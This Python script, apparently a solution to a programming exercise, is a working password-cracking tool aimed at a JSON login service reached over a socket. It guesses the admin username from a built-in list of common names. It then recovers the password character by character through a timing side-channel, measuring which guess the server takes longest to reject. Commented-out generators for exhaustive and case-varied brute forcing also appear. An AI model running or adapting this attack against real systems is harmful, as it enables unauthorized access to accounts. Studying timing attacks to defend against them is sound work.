import socket
from sys import argv
# from itertools import product, combinations
import json
import time

res = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default', 'new_user', 'some_user',
       'new_admin', 'administrator', 'Administrator', 'superuser', 'super', 'su', 'alex', 'suser', 'rootuser',
       'adminadmin', 'useruser', 'superadmin', 'username', 'username1']


# def brute_force():
#     base = [chr(_) for _ in range(97, 123)] + [str(__) for __ in range(10)]
#     x = 1
#     while True:
#         for p in product(base, repeat=x):
#             yield ''.join(p)
#         x += 1
#
#
# def combine_case():
#     for r in res:
#         yield r
#         for i in range(len(r)):
#             for j in combinations(list(range(len(r))), i + 1):
#                 t = r
#                 for k in j:
#                     t = t[:int(k)] + t[int(k)].upper() + t[int(k) + 1:]
#                 yield t


def test_pass():
    char = [chr(_) for _ in range(65, 91)] + [chr(_) for _ in range(97, 123)] + [str(_) for _ in range(10)]
    for i in char:
        yield i


def json_req(login, password):
    return json.dumps({"login": str(login), "password": str(password)}, indent=4).encode()


def json_read(json_string):
    json_string = json_string.decode()
    return json.loads(json_string)['result']


new_socket = socket.socket()
new_socket.connect((argv[1], int(argv[2])))

correct_login = ''
max_time = 0
for logins in res:
    new_socket.send(json_req(logins, ''))
    start = time.time()
    response = new_socket.recv(1024)
    end = time.time()
    if max_time < (end - start):
        correct_login = logins
        max_time = end - start

correct_password = ''
k = 0
max_time = -1
while True:
    k += 1
    correct_letter = ''
    max_time = -1
    for t in test_pass():
        new_socket.send(json_req(correct_login, correct_password + t))
        start = time.time()
        response = new_socket.recv(1024)
        end = time.time()
        if json_read(response) == 'Connection success!':
            print(json_req(correct_login, correct_password + t).decode())
            exit(0)
        if end - start > max_time:
            max_time = end - start
            correct_letter = t
    correct_password += correct_letter
